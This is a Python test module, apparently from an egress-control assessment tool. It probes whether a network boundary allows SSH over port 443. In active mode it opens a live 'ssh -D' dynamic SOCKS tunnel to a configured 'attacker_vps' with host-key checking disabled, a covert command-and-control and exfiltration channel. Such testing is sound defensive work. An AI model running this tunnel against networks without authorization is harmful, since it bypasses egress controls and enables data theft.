"""Family A — SSH-over-443 (+ dynamic SOCKS).

SSH on 443 with dynamic port-forwarding (-D) is a classic tunnel that hides in the
"HTTPS" port. This tests whether the boundary lets an SSH session ride 443 to your
VPS.

  * INDICATOR (default): TCP-connect to attacker_vps:443 and read the banner. An
    "SSH-2.0-..." banner on 443 = SSH egress on the HTTPS port is permitted and the
    boundary is not enforcing that 443 is really TLS/HTTPS (App-ID gap). Finding.
  * ACTIVE (--active): open a real SSH dynamic-SOCKS tunnel (ssh -D) to
    attacker_vps:443 for a few seconds and confirm, then tear it down. Needs an SSH
    server listening on 443 on your VPS and credentials/keys configured for it.

Config: attacker_vps. MITRE T1572 / T1048.
"""
from modules import _util as U
import socket

META = {
    "id": "ssh_over_443",
    "name": "SSH-over-443 (dynamic SOCKS)",
    "category": "Egress / C2",
    "test_type": "attack_sim",
    "family": "A",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "App-ID on 443 (deny non-HTTPS) + SSH client egress control",
    "fix": "SD-WAN",
    "mitre": ["T1572", "T1048"],
    "tactic": "Command and Control",
    "cwe": ["CWE-923"],
    "requires": [],
    "ports": [],
    "success_regex": r"^SSH443-|^BANNER ",
    "blocked_regex": r"SSH-over-443 blocked",
}


def run(target, ctx):
    vps = ctx.cfg("attacker_vps")
    out = ["# SSH-over-443 test (Family A)"]
    if not vps:
        out.append(U.skip("attacker_vps not configured — need an SSH server on your "
                          "VPS:443 to test SSH-over-443."))
        return "\n".join(out)

    # ---- indicator: reach 443 and read a banner --------------------------------
    try:
        s = U.connect(vps, 443, ctx, timeout=8)
    except OSError as e:
        out.append(f"SSH-over-443 blocked — cannot reach {vps}:443 ({e.__class__.__name__})")
        return "\n".join(out)
    try:
        s.settimeout(6)
        banner = s.recv(64).decode(errors="replace").strip()
    except socket.timeout:
        banner = ""
    finally:
        try:
            s.close()
        except Exception:
            pass
    if banner.startswith("SSH-"):
        out.append(f"BANNER {vps}:443 -> {banner!r}")
        out.append(f"SSH443-REACHABLE — an SSH service answered on {vps}:443; the boundary "
                   "permits SSH on the HTTPS port and is not enforcing TLS/App-ID there "
                   "(dynamic SOCKS could tunnel out). [FINDING]")
    else:
        out.append(f"reached {vps}:443 but no SSH banner (got {banner!r}); egress to 443 "
                   "is open — run --active to attempt the SSH tunnel.")

    if not ctx.allow_active:
        out.append(U.skip("--active not set — not opening a live SSH tunnel."))
        return "\n".join(out)

    # ---- active: ssh -D dynamic SOCKS to vps:443 -------------------------------
    if not U.have("ssh"):
        out.append("[ERROR] --active set but 'ssh' client not found")
        return "\n".join(out)
    argv = ["ssh", "-p", "443", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=8", "-N", "-D", "11081", vps]
    out.append(f"[ACTIVE] ssh -D 11081 -p 443 {vps} for up to 12s "
               "(needs sshd on 443 + key/agent auth)…")
    log, matched = U.run_transient(argv, seconds=12,
                                   look_for=["Authenticated", "Local forwarding", "debug1: Entering"])
    out.append(log)
    # ssh -N is quiet; treat "no immediate auth failure and process stayed up" as reachable
    if matched or "Permission denied" not in log and "Connection refused" not in log:
        out.append("SSH443-TUNNEL attempted (see log). If it stayed connected, dynamic "
                   "SOCKS over SSH-on-443 works through the SD-WAN. [FINDING]")
    else:
        out.append("SSH-over-443 blocked — SSH auth/connection failed on 443.")
    return "\n".join(out)
